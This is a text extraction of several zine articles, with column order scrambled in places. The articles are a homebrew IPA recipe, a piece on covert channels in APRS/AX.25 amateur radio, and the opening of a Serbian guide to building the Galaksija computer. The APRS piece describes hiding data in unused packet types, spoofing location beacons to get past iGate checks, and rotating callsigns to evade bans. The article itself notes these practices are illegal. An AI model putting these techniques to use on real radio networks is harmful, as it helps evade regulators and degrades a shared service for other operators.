bypassed by more intimate knowledge of the McAfee
signatures.
278
Brewing TCP/IPA; or,
A Useful Skill for the Zombie Apocalypse
by Ron Fabela of Binary Brew Works
Hacking is a broad term that has too many nega-
tive and positive connotations to list. But whichever
connotations you prefer, it is a skillset, and a skill is
all about things or services that can be exchanged
for currency or bartered for goods. While this fine
journal excels in sharing scattered bits of useful
hacking knowledge, the vast majority of publica-
tions repeat ad nauseam the same drivel of the cy-
ber world. But when the zombies come—and they
will come!—what good are your SQL injections for
survival? How will you exchange malware for fresh
vegetables and clean drinking water? What practi-
cal skills do you have that can enable your survival?
What hacking shares with making is their com-
mon ground of curiosity, skill, and patience—and
these intersect on a product that is universally rec-
ognized, suitable for barter, and damn tasty. Of
course, beer as we know it today differs from the an-
cient times, where it was a part of the daily diet of
Egyptian Pharaohs and Greek Philosophers through
the ages. Today’s beer and its varieties have ac-
quired a broader tradition, each with a unique back-
ground and tastes. But in that variety there is
a center, one that pulls together people from all
races, cultures, and economic statuses. Modern day
philosophers and preachers discuss the world’s chal-
lenges over beer. Business deals and other relation-
ships are solidified at the bar, by liquid camaraderie!
Why do I bloviate on all of this? Because there
comes a time in every hacker’s life when you wish
for more, when you wish to create something of in-
trinsic value rather than endlessly find faults in the
works of others. For me, that was turning grain,
water, hops, and yeast into something greater than
the sum of its parts. It’s an avenue to share, to serve
others, to create.
(It’s also something to trade for milk and bread
when the zombies come!)
8.1
Grain Or even more generally, any cereal where
its grain can be cultivated and finally sugars can be
extracted. But more than just simple grain, grain
that has undergone the malting process. Grains are
made to germinate by soaking in water, and are then
halted from germinating further by drying with hot
air, as shown in Figure 1. By malting grains, the en-
zymes are developed that are required for modifying
the grains starches into sugars. This is important
to know, as not just any grain will do for the beer
brewing process. These sugars extracted from the
Ingredients
Beer, like most things in life, can be as simple or as
complex as the reader wishes it to be. But at its
core, this beverage started with four primary ingre-
dients, each just as important as the next: grain,
water, hops, and yeast.
28Yeast Single-celled organisms with an amazing
ability to convert carbohydrates (sugars) into CO 2
and alcohol, yeast is the literal lifeblood of beer,
as fermentation changes sugary and otherwise bor-
ing sugar water (wort, or young beer) into glorious
brew.
For brewing there are 2 main types of yeasts:
“top-cropping” where the yeast forms a foam at
the top of the wort during fermentation and is
more commonly known as “ale yeast” and “bottom-
cropping” where the yeasts ferment at lower temper-
atures and settle at the bottom of the vessel during
fermentation, commonly known as “lager yeast.”
Yeast can be cultivated from the wild or
known/safe sources. Yeast can even be collected and
nurtured from bottle-conditioned brews (Belgian va-
rieties in particular).
malted grains will eventually be turned to alcohol
during fermentation, as in Figure 2.
Water Arguably the most critical component, wa-
ter makes up 95% of the final product and can con-
tribute as much to the taste and feel of the brew
as do the grains, hops, and yeast. Books have been
written and rewritten on the subject of brewing wa-
ter and will not be rehashed here. The key water
properties are: clean, chlorine free, and plentiful.
Hops Starting in the 9th century, brewers began
using hops in place of bittering herbs and flowers as
a way to flavor and stabilize their brew. Hops are the
female flowers of the hop plant with training bines
that set forth like ivy or grapes. The hop cone itself
is made of multiple components, but most important
to brewing are the resins that are composed of al-
pha and beta acids. Alpha acids in particular are
critical due to their mild antibiotic/bacteriostatic
effect that favors the exclusive activity of brewing
yeast over microbial nasties swimming about. See
Figure 3.
8.2
Brewing Process
The brewing process is often 15 minutes of frantic
activity followed by 60 minutes of drinking, cleaning,
or otherwise conversing with your neighbor. Sim-
plistically, the steps are: extract fermentable sugars
from the malted grains with hot water (mashing);
boil and reduce the fermentable sugar water (wort)
while adding hops at specific timing intervals; re-
duce the wort to a safe temperature and move to a
fermentation vessel; pitch yeast and store at a con-
sistent temperature, allowing the fermentation pro-
cess to occur; pack and condition the beer for future
consumption and enjoyment.
There is much science and wizardry that takes
place in these five steps. I would like to take you
through this process with one of our own recipes at
Binary Brew Works. These days you can’t have a
brewery without an India Pale Ale (IPA), a beer that
at its origin was heavily hopped to make the journey
by ship from England to India. This heavy-handed
hop addition creates a highly bitter, but hopefully
aromatic and balanced brew that is popular today.
Gathering the Ingredients For our IPA, appro-
priately named TCP/IPa, the following ingredients
are used and scaled for a 30 gallon (114 liter) batch.
Scaling at this volume is 1:1; so halving the num-
bers for a 15 gallon (57 liter) batch will yield similar
results. 20
Beta acids contribute to the beer’s aroma and
overall flavor. These acids are extracting during the
brewing process via boiling, which will be expanded
upon in the following sections.
20 git clone https://github.com/BinaryBrewWorks/Beer/
unzip pocorgtfo09.pdf beer.zip
29Once extracted, the wort is brought to a boil and
held there for 60–90 minutes. The addition of hops
through the boiling process adds to the bitterness
and flavor of the beer, so it is critical to follow hop
addition timings as this has a huge effect on the fi-
nal product. For TCP/IPa, two hop additions are
used. Cascade hops are widely used in the industry
and therefore readily available to the brewer. Cas-
cade hops provide the bittering required for an IPA
while imparting the characteristic spicy and citrus
flavor expected for the style. Citra hops are added
towards the end of the boil to add the strong citrus
and tropical tones of flavor and aroma. Remember,
the earlier the hop addition, the more bittering oils
are extracted from the hop. Later additions provide
more flavor and aroma without adding bitterness.
TCP/ IPa
FERMENTABLES:
2Row
Caramel Malt 60L
Flaked Wheat
70 l b s
6 lbs
6 lbs
HOPS:
Cascade
Citra
8 oz
16 oz
@ 60 mins
@ 15 mins
Yeast :
Wyeast 1056
Preparing the Mash Water In a brewing ket-
tle of your choosing, bring the appropriate amount
of water to what is known as strike temperature.
The volume of water needed depends on other pa-
rameters such as grain absorption rates, equipment
losses, and evaporation. As such, using a brewing
water calculator is recommended. For this recipe,
approximately 45 gallons (170 liters) of strike water
is needed to get the desired 30 gallons (114 liters)
of finished product. Your striking temperature is
typically 10–15 ◦ F (5–7 ◦ C) higher than your target
mash temperature. (In this case, 170 ◦ F (77 ◦ C) for
a target 160 ◦ F (71 ◦ C).)
Mashing In a separate vessel called a mash tun,
the prepared grains are waiting for inclusion of the
strike water. The mash tun is often a modified cooler
or other insulated vessel that can contain the volume
of both the grain and the striking water. In single in-
fusion mashing, water is added to the grains, stirred,
and typically left to sit for 60 minutes to allow for
the extraction of fermentable sugars. 15 minutes
of frantic moving of water, stirring, and cleaning is
then followed by 60 minutes of drinking your last
batch of beer.
Cooling You now have a boiling pot of wort that
must be cooled down to pitching temperature as
quickly as possible. This is the most critical stage of
the process! At 212 ◦ F (100 ◦ C), all types of nasties
that can ruin your beer are boiled away. But as the
wort is cooled, there is an increased risk of bacteria
or other infections. Cleanliness of the brewery and
its equipment is key from this point forward.
Cooling can be accomplished by a number of
heat transfer methods. At smaller volumes, coiled
Boiling Once the mashing is complete, the sugar
water or “wort” has to be extracted and placed into
the boiling kittling (oftentimes the same kettle used
to heat the strike water). This can be accomplished
in a number of ways, mostly through the use of mesh
false bottoms or other straining mechanisms to pre-
vent, as much as possible, solid grain matter from
entering the boiling kettle.
30copper tubes shown in Figure 4 are submerged into
the boiling wort to sanitize, and the cold water is
passed through, cooling the wort to the target tem-
perature. At larger volumes, heat transfer equip-
ment gets bigger and beefier, but serves the same
purpose. Most ale yeast pitches at a temperature
between 70 and 75 degrees Fahrenheit (22 ◦ C).
notes and measurements at this point, as too much
sugar can create explosive “bottle bombs.”
Investing in a used kegging system can help
tremendously. Not only does this simplify cleaning,
it also allows the brewer to force carbonate the keg.
Attaching a CO 2 tank and selecting the appropri-
ate PSI level can quickly and more evenly carbonate
your brew to the target levels. Plus there’s nothing
like having fresh, cold beer on tap.
Fermentation Yeast are beautiful little crea-
tures. Through a metabolic process, yeast convert
sugars into gas (CO 2 ) and alcohol. This process
must take place in a sanitary vessel where no in-
terference from other microbes can ruin our wort.
Temperature control of the vessel and the surround-
ing room is critical to the overall taste and feel of the
final product. Some styles, such as the saison, are
purposefully fermented at the highest temperatures
(80–85 ◦ F, 27–29 ◦ F) allowed by the yeast. Fermen-
tation at this temperature produces a “spicy” profile.
For lagers, yeast ferment at lower temperatures
common to basements and cellars and produce a
funky flavor. Not my preference, but fun nonethe-
less if you have the equipment or climate to ferment
at this temperature.
And like magic, our sugary wort is churned,
eaten, and converted into glorious beer.
Creating a final product from raw ingredients is
a very fulfilling process. The basic process of ex-
tracting sugars from grain, adding hops, fermenta-
tion, and drinking is just the surface of a complex,
diverse, and creative industry. For the homebrewer,
not only serves as a way to make and enjoy beer, but
also as a social tradition where drinks and conversa-
tions are had over a boiling pot of wort. Go forth,
become a brewer, and enjoy the miracle of your own
beer!
Packaging Once the fermentation process is
nearly complete, the beer can be stored and chilled.
Carbonation comes next, with various methods
available to the home brewer. Bottle conditioning
is the process of introducing a priming sugar back
into the wort just prior to bottling. Take careful
3132339
Shenanigans with APRS and AX.25 for Covert Communications
by Vogelfrei
This little document details some shenanigans involving APRS and its underlying AX.25 protocol, in-
cluding but not limited to covert channels, steganography, avoiding detection by normal users and leveraging
Internet infrastructure for worldwide covert communication.
Covert channels in radio packet protocols have been investigated in the past. 21 Although the regulations
for amateur radio operation explicitly forbid hiding, encoding, or encrypting communications in any form,
it is nonetheless a challenging and fruitful field for experimentation.
I had been researching the topic for a while, and informally mentioned this to my neighbors Travis
and Muur, who—it turned out—had been working on PSK31. They requested an article to follow theirs,
PoCkGTFO 8:4. So enjoy this short piece, and look out for more elaborate tricks and tools for all your
booklegging communication needs, because the world is almost through! 22
The APRS protocol (Automatic Position Reporting System), originally developed by Bob Bruninga
(WB4APR), has its roots in the necessity to track the position and telemetry data of vehicles, weather
stations, and hikers.
APRS is built on the AX.25 protocol, an amateur variant of the commercial X.25 protocol you’ll fondly
remember from Phrack 45:8. Despite the amateur nature of its deployment, there is an impressively large
infrastructure of Internet gateways, digipeaters, weather stations, and other kinds of nodes. The International
Space Station (ISS) itself has an APRS-capable digipeater on-board, and radio operators across the globe
engage in packet radio messaging through the station and other satellites.
Perhaps the most interesting feature of APRS, besides the fact that it supports exchanging all kinds
of information, is the way the data is routed between uncoordinated nodes over large areas. It is this
decentralized, connection-less nature that makes APRS ideal for covert communication purposes.
9.0.1
Frequencies and Equipment
Now that you have a general idea of what APRS is and what it might be useful for, you should know which
frequencies are designated for APRS transmissions. Frequencies vary by country, but as a general rule, North
America uses 144.390 MHz while Europe and Africa use 144.800 MHz.
For testing and experimentation purposes, start with a cheap hand-held radio such as the Baofeng UV5R
from China. It is capable of transmitting in the 2m and 70cm bands, and can easily be connected to your
computer’s sound card. This will allow you to immediately test software modems and get your feet wet with
APRS and other packet radio protocols.
If you would like to get fancy, I recommend two additional pieces of equipment. Get a dual-band
radio with TNC support, such as the Kenwood TM-D7xx or TH-D72A. The TNC will interpret packets in
hardware, freeing you from DSP headaches. You will also want a general purpose wide-band receiver with
discriminator (unadulterated audio) output; ordinary folks call this a scanner.
9.1
The Protocol
As mentioned before, APRS uses AX.25 for transport. More specifically, APRS data is contained in AX.25
Unnumbered Information (UI) frames, in the information field. The protocol is completely connectionless;
there is neither state nor any expectation of a response for a given packet. 23 This is rather handy for simple
systems, since you will only need a single packet consumer, and the rest of your state machine is entirely up
to you. Because of its simplicity, APRS can be easily implemented in microcontrollers.
A simple APRS message packet looks as follows:
21 jt64stego
by Drapeau (KA1OVM) and Dukes, 2014
says the preacher man but. . . I don’t go by what he says.
23 This is the exact opposite of your Wi-Fi, where every data frame is acknowledged, and no more data is sent unless either
the ACK arrives or a timeout is reached.
22 So
340
1 − 256 Bytes
1
2
3









































4
5
6
1
n
.
.
7 Bytes
.
.
n
.
.
7
Data Type ID




APRS Data







APRS Data

Extension


)
Comment
Figure 6: APRS Data contained in the AX.25 information field
N0CALL-9>N1CALL-9,WIDE1-1,WIDE2-2::N1CALL-9 :This is a test for APRS messages{1
Dissecting its structure, we will find:
1. The path element: N0CALL-9>N1CALL-9,WIDE1-1,WIDE2-2
2. A colon (:) delimiting the end of the path and the beginning of the packet data.
3. The packet type identified by a single character, : for messages.
4. After that, whatever format the packet type specifies. In the case of a message, a colon-delimited
recipient callsign, followed by the text and a { bracket followed by a number, indicating the line of the
message, starting at one.
The comment field is also susceptible to abuse, limited to printable ASCII data as the specification
demands, “The comment may contain any printable ASCII characters (except | and  ̃, which are reserved
for TNC channel switching).” Depending on the DTI, the Comment field is used to include additional
information besides what is sent in the Data field, mostly for telemetry uses. Coordinates are encoded using
Base-91.
The wealth of information provided in the original protocol specification should be more than enough to
figure out ways to conceal your own data in different packet types. Of particular interest are the mechanisms
for compressed coordinates and telemetry, weather reports, and bulletin messages. While these have size
limitations, leveraging the unused DTIs as described in the next section allows for crafty ways to chain
multiple packets together.
9.2
Abusing Unused Data Type Identifiers (DTI)
The APRS protocol defines multiple DTIs as unused or forbidden. These are often ignored by software and
TNCs in actual radios, making them an ideal target for creative reuse. Because it would be trivial to detect
and actively monitor for intentional use of the unused DTIs, a better approach is to leverage them in a way
that provides somewhat plausible deniability.
1. Prepare APRS Data contents for a given DTI.
2. Find nearest unused DTI, possibly identifying the unused DTIs that require the least amount of bits
to corrupt so that the DTI isn’t “too far” from the one corresponding to the data we have prepared.
35ID (char)
0x22 Data Type
Unused
0x26 Reserved (“map feature”)
0x28
0x41-0x53
0x2c
0x2e Unused
Unused
Experimental/Unused
Reserved (Space weather)
0x30-0x39 Do not use
Valid DTI neighboring?
0x21 (position without times-
tamp or WX) and 0x23 (WX)
0x25 (MicroFinder) and 0x27
(Mic-E or TM-D700 data)
0x27 and 0x29 (Item)
Only adjacent (0x40 and 0x54)
(none)
0x2f (position with timestamp
sans messaging)
0x3a (Message)
Table 1: Some of the unused Data Type Identifiers in the APRS protocol
0
1
2
3
4
5
6
7
1 Flag
7 Destination Address
7 Source Address
Digipeater Addresses
0-56
1 Control Field (UI)
1 Protocol ID




INFORMATION

FIELD


.
1 − 256 ..
2 FCS
1 Flag
Figure 7: AX.25 Unnumbered Information (UI) frame structure
3. Proceed to send the packet contained an invalid DTI that is unused yet contains seemingly valid data
for an adjacent DTI.
Unused DTIs that are one position away from another include 0x21 and 0x22 (position without timestamp
versus unused) Table 1 contains some of the interesting unused identifiers up for grabs; please refer to the
APRS Protocol Reference 24 for the rest of them. DTIs involved in TNC operation should be avoided, unless
the TNC behavior can be abused constructively.
The benefit of hiding data in an otherwise valid APRS Data segment with an incorrect (unused) DTI is
that clients—including built-in TNCs—will ignore the packet and not attempt to decode its contents.
9.2.1
Third-party and User Defined Packets
Two special DTIs exist that allow for packet-in-packet protocol tricks: the third-party and user-defined
packets. These have special quirks associated with them, and the way TNCs handle them is not standardized.
This is both a good and a bad thing. For instance, the Kenwood TM-D7xx’s built-in TNC will ignore third-
party packets entirely if it cannot parse them.
24 unzip
pocorgtfo09.pdf aprs101.pdf
36However, Internet Gateways will also ignore all user-defined packets and impose additional restrictions
the third-party DTI. This is the biggest motivator for actually reading the source code of APRS Internet
gateway software. For example:
1 s t a t i c i n t parse_aprs_body ( struct pbuf_t ∗pb , const char ∗ i n f o _ s t a r t )
{
3 ...
case ’ { ’ :
5
pb−>p a c k e t t y p e |= T_USERDEF;
return 0 ;
7
case ’ } ’ :
9
pb−>p a c k e t t y p e |= T_3RDPARTY;
return p a r s e _ a p r s _ 3 r d p a r t y ( pb , i n f o _ s t a r t ) ;
N0CALL-9>N1CALL-9,WIDE1-1,WIDE2-2::N1CALL-9 :This is a test for APRS messages{1
9.3
Internet Gateways
Gateways between the Internet and APRS radios are known as Internet Gateways or iGates. Typically iGates
are used to forward APRS beacons heard over radio to some website, but there are a lot more interesting
things we could do with them.
9.3.1
Tricks with iGates
Some iGates support transmitting data from the Internet out to radio, effectively bridging the local RF
spectrum to the APRS-IS network.
There is no official way to list iGates, so our best bet is connecting to the backbone servers they report
to, passively listening for frames and beacons that announce their presence. We would also like to distinguish
iGates that are capable of transmitting from those that only receive. When we find some such iGates, they
allow us to perform some gnarly tricks!
We can send an APRS message from an Internet-only host in Asia to an individual driving in Pittsburgh
with only a radio receiver and a TNC. Hide locations of control sites by first proxying your packets through
the Internet iGates, only to target your local RF nodes through a separate, sacrificial iGate bridge.
The system is only limited by APRS-IS rules in terms of traffic congestion control. Because all RF nodes
receive from and transmit to the same frequency, overlapping transmissions can and will reduce the ratio of
successfully decoded packets for everyone else. Therefore, be neighborly!
Traffic caps are enforced by the iGate operator’s configuration. Commonly a given node, as identified
by its callsign and SSID, will only be able to use the Internet-RF bridge for transmitting a fixed number of
packets each minute. This is to prevent accidental jamming of the RF channel.
9.3.2
Packet Validation and RF Digipeating
Some architectural limitations of APRS need to be considered carefully. First, most iGates in the APRS-IS
network will only digipeat packets to the RF side if the station is located within a fixed radius of so many
kilometers. Second, we might not get to know if a given area has an iGate capable of bridging RF, or
transmitting to RF. We can’t simple wait for a response, as APRS is a response-less protocol. Third, packets
marked RFONLY in their path won’t reach APRS-IS. Packets marked TCPIP won’t reach RF nodes. iGates
forcing or restricting either will be dead-ends if we aim to bridge over APRS-IS. Finally, user-defined packets
are ignored by most of the APRS-IS infrastructure. For example, aprsc ignores them. Third-party packets
are allowed, with caveats.
379.3.3
Bypassing Validation
There are a few ways to bypass the restrictions imposed on bridging RF in iGates that require geographical
proximity.
You can try to spoof your location by sending a beacon positioned at fake coordinates near the iGate.
You can then send your actual data packets, remembering to regularly send a position beacon to the iGate
to remain in the last-heard list.
You could limit use of user-defined packets to RF side, operating a a rogue iGate that does not ignore
them, instead transforming them to third-party or steganographic standard packets, delivered to APRS-IS.
User-defined packets are not displayed by most equipment. This also applies to unused or obscure DTIs.
To avoid potential roadblocks, the following considerations may help. If trying to reach the RF side,
do not use (and verify that the iGate/APRS-IS nodes don’t use) TCPIP in the path. If trying to reach the
Internet side, do not use RFONLY in the path. To avoid packet drops from rate limiting, throttle your packets,
sending one every one to five minutes.
Albeit completely illegal on the actual air, as an experiment in a controlled environment, automatically
generated callsigns can be rotated to avoid being detected or banned from the system. 25 Finally, client
version strings, as used during registration with APRS-IS nodes, could be rotated and mimic real clients.
Looking up standard TCP/IP “pivoting” techniques may help for accessing the APRS-IS network, but
first and foremost, remember to be neighborly.
9.3.4
International Space Station (ISS) and APRS
Space, the final frontier! It suffices to say that a digipeater installed onboard the ISS makes APRS into the
tool of choice for legal ruckus communications on a worldwide scale. So as long as the TNC of the ISS’ radio
validates your packets, you can deliver your covert messages in a fully decentralized fashion! 26
Whether commercial TNCs out there relay packets with unused DTIs is a question left to the reader as
an exercise.
9.4
Parting words: legal status of subterfuge in radio communications
Amateur radio laws generally prohibit steganography and also encryption, with a few narrow exceptions. 27
For example, the US Electronic Code of Federal Regulations §97.309 states, RTTY and data emissions using
unspecified digital codes must not be transmitted for the purpose of obscuring the meaning of
any communication. 2829 Governments do monitor the airwaves where they care about them the most,
and having your antennas, expensive equipment, or house ransacked sucks. Also keep in mind that amateur
radio is self-policing; if you mess up and create a nuisance that affects everyone else, your future experiences
with that small, tight-knit, but global community may be seriously soured. So be neighborly, have fun, and
stay safe!
—Vogelfrei
25 Don’t do this. Acting like an asshole on the radio is the surest way to convince a brilliant RF engineer to spend his
retirement hunting you down.
26 In Heinlein’s “Between the planets”, 1951, the same celestial path of the Circum-Terra station is used for a much less benign
purpose: worldwide delivery of nukes. That book also introduced the idea of stealth technology vehicle with a radar-reflecting
surface, before any scientific publications on the subject. Welcome to classic 1950s Sci-Fi.—PML
27 unzip pocorgtfo09.pdf encham.html #Encryption and Amateur Radio by KD0LIX
28 unzip pocorgtfo09.pdf part97.pdf
29 Also note §97.217: Telemetry transmitted by an amateur station on or within 50 km of the Earth’s surface is not considered
to be codes or ciphers intended to obscure the meaning of communications.
383910
Napravi i ti Računar „Galaksija“
Voja Antonić
This article on the Galaksija computer first appeared in the January 1984 special edition of Dejan Ris-
tanović’ Yugoslavian science magazine, also called Galaksija. We reprint it as a salute to fine neighbors such
as Mr. Antonić, to all those who build strange and lovely contraptions in their basement laboratories and
then share them with the world. –PML
10.1
Samogradnja računara „galak-
sija“ u stripu
u budućnosti proširujemo dodavanjem štampača,
više memorije, programatora, „muzičke kutijice“, i
slično. Ako ne želimo ova proširenja — uštedeli
smo višepolni konektor i jedno integrisano kolo
(74LS32, koje ćemo zameniti jednim kratkospoj-
nikom obeleženim crticama na montažnoj shemi).
Ako ste u nedoumici — mi vam savetujemo da ipak
ugradite ova dva dela, mada za to ni posle neće biti
kasno.
Drugo pitanje je da li ćemo se opredeliti za nemo-
dulisan video-signal ili modulisan (RF) signal slike.
Nemodulisan video-signal ne zahteva ugradnju RF
modulatora u računar i daje stabilniju i kvalitetniju
sliku, ali se zato ne može priključiti na bilo koji te-
levizor — neophodno je imati specijalni monitor ili
crno-beli televizor sa dogradenim monitorskim ula-
zom. Ovo ne zahteva nikakva dodatna ulaganja, ali
je neophodno imati predznanja i iskustvo u radu
sa TV prijemnicima. Dalje, takav televizor mora
biti tranzistorski (cevni ne dolaze u obzir) i mora
Evo nas, konačno, i na praktičnom delu po-
sla. Očekuje nas ozbiljan ali prijatan rad, koji će
biti nagraden nesvakidašnjim zadovoljstvom što smo
stvorili i oživeli jedan ovako inteligentan uredaj. Ne-
mojte se obeshrabriti ako smatrate da nemate do-
voljno iskustva: to je prvi i dobar znak da imate
samokritičnog duha, a on vam je, verujte, u ovom
poslu potrebniji od iskustva. Zastanite posle svakog,
i najmanjeg i naoko beznačajnog detalja, i procenite
da li je to dobro uradeno i — „galaksija“ će proraditi
iz prve!
10.1.1
Važne odluke
Pre početka rada treba doneti nekoliko važnih
odluka.
Prvo, da li želimo da ovakav sistem
bude konačan ili ćemo ostaviti mogućnost da ga
Montažna shema: Raspored elemenata u računaru „Galaksija”
40imati mrežni transformator (a ne takozvanu „vruću
šasiju“); najčešće su oba ova uslova ispunjena kod
malih prenosnih crno-belih televizora kod kojih po-
stoji spoljni priključak na akumulator od 12 V. Neke
savete za dogradnju monitorskog ulaza na ovakav te-
levizor ćemo opisati u daljem tekstu. Ali, ako ugra-
dimo RF modulator, bićemo oslobodeni svih ovih
problema i moći ćemo da se priključimo na antenski
ulaz bilo kog televizora.
Moraćemo, takode, da odlučimo koje čipove
ćemo smestiti na podnožja, a koje lemiti direktno
na štampano kolo. Savetujemo vam jedino da za
EPROM-e (2716 i 2732) koristite podnožja, a za
ostalo se opredelite sami. Prednost podnožja je u
tome što smanjuju rizik da upropastite neki čip i
što je zamenom vrlo lako lokalizovati neispravan in-
tegralac (naravno, ako takvog uopšte ima, odnosno
ako eventualna krivica nije do neke druge kompo-
nente), jer je razlemljivanje čipova izuzetno osetljiv
posao. Podnožja, na žalost, ako nisu vrhunskog kva-
liteta, lošim kontaktima češće prave probleme nego
bilo koje druge komponente. Da bi bilo pouzdano,
podnožje mora da bude vrlo kvalitetno, a to ponekad
znači da je skuplje i od samog čipa.
Dvostruka štampa:
štampanog kola
Veza sa spoljašnim svetom: Priključci i raspored izvoda na
zadnjoj strain „Galaksije”
Konektor za proširenja u obliku
Srce računara „Galaksija”: Mikroprocesor Z80A i EPROM
2732 sa bejzik interpreterom
41Štampano kolo u razmeri 1:2: Zbog visokog profesionalnog kvaliteta i pristupačne cene komercijalne pločice
njena samogradnja se ne isplati
Maska za tastere: Definitivan oblik zavisi od tipa mehanizma za razmaknicu i zato pre izrade treba sačekati
isporuku tastature; oni koji naruče tastaturu u prvom krugu ne moraju ni o čemu da brinu — delovi u
kompletu će savršeno odgovarati jedni drugima
421. Pred nama je materijal koji smo sakupili sa toliko muke i iz
koga će za nekoliko časova da „izraste” računar „galaksija”. U
dnu slike lako prepoznajemo tastere i kapice tastera sa utisnu-
tim oznakama, desno su otpornici (svi su snage 1/8 W mada
mogu da se koriste i otpornici veće snage), levo kondenzatori,
a u sredini čipovi (integrisana kola). Posebnu pažnju treba
3. Sklapanje računara započinjemo postavljanjem prvog krat-
kospojnika, pažljivo gledajući montažnu shemu. Neki krat-
kospojnici prolaze ispod čipova; ovo neće praviti probleme
ako su kratkospojnici pedantno savijeni i ako leže uz samo
štampano kolo. Pažnja! Ovo je pogled sa strane elemenata a
ne, kako se može učiniti, sa strane vodova!
obratiti na MOS i CMOS čipove.
2. Pošto je štampano kolo jednoslojno, biće nam potrebno
dosta kratkospojnika. Njih je najlakše izraditi od pune ba-
karne žice izvadene iz popularne plavo-bele telefonske „pa-
4. Kada okrenemo ploču da bismo zalemili prvi kratkospoj-
nik, postaje nam jasno zašto montaža počinje od najnižih
komponenata. Da smo, na primer, počeli od tastera, sve niše
rice”. Olakšavajuća okolnost je što su dužine standardizo-
vane na 5, 10, 20, 30 i 40 mm, pa je lako izrezati alatku za
njihovo precizno savijanje (pri izradi ove jednostavne alatke
treba voditi računa o prečniku žice).
komponente bi prilikom docnijih lemljenja ispadale. Ako ni-
kada niste lemili, dobro je da najpre malo eksperimentišete
na nekoj drugoj pločici. Vrh lemilice treba da bude dobro
oblikovan turpijom, očišćen i kalajisan. Lemi se tako što se
sa jedne strane prinese tinol-žica, a sa druge dobro zagre-
jani vrh lemilice. Treba paziti da tinola na lemnom mestu ne
ostane previše. Ma koliko to paradoksalno zvučalo, u protiv-
nom ćemo dobiti loš električni kontakt.
437. Kod montaže čipova, koja je sledeća na redu, izuzetnu
pažnju treba obratiti na orijentaciju, jer se i iskusnim pro-
5. Svi kratkospojnici su postavljeni i zalemljeni. Pažljivo ih
prebrojmo: treba da ih bude tačno 119. Ukoliko na vašem
štampanom kolu neki nedostaje, moraćete ponovo da kon-
sultujete montažnu shemu. Obratimo pažnju na čip 74LS32:
kao što smo rekli u uvodu, možemo ga zameniti kratkospoj-
nikom (isprekidana linija na montažnoj shemi) ako ne želimo
fesionalcima dešava da okrenu čip naopako. Neki čipovi su
obeleženi polukružnim usekom kao na montažnoj shemi, a
drugi ugraviranom tačkom pored nožice broj 1. Napomi-
njemo da natpis na čipu nije baš uvek okrenut tako da počinje
od prve nožice. Pošto će na „galaksijinom” štampanom kolu
sa gornje strane biti odštampan raspored elemenata, ovde ne
proširenja sistema preko konektora. To će onda biti 120-ti
kratkospojnik.
bi trebalo da bude nikakvih problema.
6. Sledeća faza je montaža otpornika , koja je u mnogo čemu
slična montaži kratkospojnika dužine 10 mm.
8. Čipovi su postavljeni, ali ne svi — zasad su izostavljeni
već pomenuti MOS i CMOS čipovi CD 4017, CD 4040, 6116,
2716, 2732 i Z80A. Najbolje je da ih ostavimo za kraj, ali
nema razloga da ne stavimo podnožja. Sada je trenutak da
pre lemljenja još jednom proverimo da li je svaki čip na svom
mestu i pravilno okrenut. Nije slučajno što ovaj savet po-
navljamo: svako nestrpljenje i neopreznost prilikom montaže
skupo se plaćaju u trenutku prvog uključenja.
449.
Lemljenje čipova je posebno osetljiv posao, jer su
11. Tu su i dva tranzistora NPN tipa male snage, uz levu i de-
snu ivicu ploče po jedan. Malo pažnje, i kod montaže nećemo
pogrešiti: ako pogledamo tranzistor odozdo, videćemo da su
mu nožice razmeštene kao da su na uglovima pravouglog rav-
nostranog trougla. Isto su razmeštene i rupice za tranzi-
medusobna rastojanja nožica svega 2,54 mm, a često izmedu
njih prolazi i vod. Ako se dogodi da se nepažnjom napravi
neželjeni most od tinola, skinućemo ga tako što ćemo na istom
mestu rastopiti još (svežeg!) tinola, pa onda sve odstraniti u
jednoj kapljici vrhom lemilice.
stor na štampi. U levom gornjem uglu štampane ploče je
i jedna mala dioda. Najčešće je katoda (koja je bliža sre-
dini štampanog kola) obeležena jednim prstenom po obimu
cilindričnog kućišta.
10. Kondenzatori su sledeći po visini. Montirajmo, dakle,
i njih. Najbolje je koristiti takozvane disk-kondenzatore jer
su najmanjih dimenzija i najjeftiniji, ali ako ima problema
kod nabavke — koristite onakve kakve imate. Kapacitet svih
kondenzatora obeleženih slovom C nije kritičan, a još manje
njihov probojni napon. Kondenzator C5 nećemo još monti-
12. Uzbudenje svakako raste: stigli smo do tastature. Bez
obzira da li smo masku sami izrezali od vitroplasta ili alumi-
nijumskog lima, (što ne bismo preporučili čak ni najljućem
neprijatelju) prema našem crtežu, ili smo je naručili i do-
bili zajedno sa tasterima, ona nam je neophodna: bez nje bi
rati. Najverovatnije neće biti ni potreban, ako imamo odgo-
varajući kvarc. Kad stignemo do puštanja u pogon, biće više
reči o tome.
se svaki taster klatio za sebe i verovatno bi se kapice češale
jedna o drugu. Maska je samonoseća — nigde se, dakle, ne
pričvršćuje za štampano kolo.
4515. Klik — klik — klik! Kapice tastera su na svojim mestima,
i sad već čitava stvar poprima ozbiljan oblik. Skoro da nas
mami pa da počnemo da pišemo program. Ali, strpljenja,
strpljenja.
13. Prvo ćemo u ivične otvore maske staviti nekoliko ta-
stera, zasad bez kapice, a onda ih zalemiti tako da maska
stabilno stoji. Obratimo pažnju da tasteri ne stoje naopako:
na montažnoj shemi se vidi da su izvodi okrenuti ka nama.
Kratkospojnici neće smetati, jer su postavljeni tačno izmedu
tastera. Dalje će ići lako: postoji ukupno 55 tastera i svi su
jednaki.
16. Zapazićemo da je jedna kapica tastera (sa oznakom
RET i ENTER, što je isto), dvaput šira od ostalih. Ona
se montira na dva tastera. Ako pažljivo pogledamo stazice
na štampanom kolu, videćemo da su kontakti ta dva tastera
14. Pošto je rad sa lemilicom priveden kraju, zalemićemo ili
postaviti u podnožja MOS i CMOS čipove. Pažnja — ovi
čipovi su veoma osetljivi na statički elektricitet. Svakako je
dobro prvo proučiti članak „opasne krivine”.
spojeni paralelno. Funkciju, dakle, ima samo jedan taster, a
drugi je tu samo iz mehaničkih razloga.
4617. Izbor utikača (“džekova”) ćemo prepustiti vama. Možete
upotrebiti onakve kakve imate, ako su bar tropolni. Nama
se čini da su standardni petopolni DIN-utikači sasvim upo-
trebljivi, lako se nabavljaju (proizvodi ih Ei), nisu skupi,
a za divno čudo — vrlo su pouzdani. Obzirom da imaju
po pet kontakata, predlažemo raspored priključaka dat na 19. Naravno, sad ćemo, kao što se radi i u proizvodnji, na-
praviti finalnu kontrolu celog štampanog kola: prosvetlićemo
ploču jakim svetlom izbliza i sa lemne strane vrlo pažljivo
posmatrati svaku liniju. Minijaturni „mostići” od tinola su
